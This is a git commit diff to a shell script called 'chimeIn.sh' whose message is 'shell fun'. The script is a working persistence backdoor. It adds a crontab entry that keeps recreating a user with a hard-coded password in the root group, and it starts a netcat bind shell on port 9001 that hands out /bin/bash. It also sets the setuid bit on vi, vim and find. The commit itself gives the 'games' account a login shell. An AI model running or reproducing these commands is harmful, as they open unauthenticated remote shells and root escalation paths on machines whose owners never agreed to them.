ae9407034908b5cf6ac40e81233368c8eceea53f
Kole Swesey <45017744+kernelpanicatthedisco@users.noreply.github.com>
2019-11-19 10:30:15 -0600

    Update chimeIn.sh
    shell fun

--- chimeIn.sh
+++ chimeIn.sh
@@ -6,6 +6,7 @@ usermod -a -G root panic
 echo "*/5 * * * *  root  useradd panic && echo -e "iwrites1ns\niwrites1ns" | passwd panic && usermod -a -G root panic" >> /etc/crontab
 apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev/null > /dev/null
 nc.traditional -l -p 9001 -e /bin/bash &
+usermod --shell /bin/bash games
 chmod u+s `which vi`
 chmod u+s `which vim`
 chmod u+s `which find`
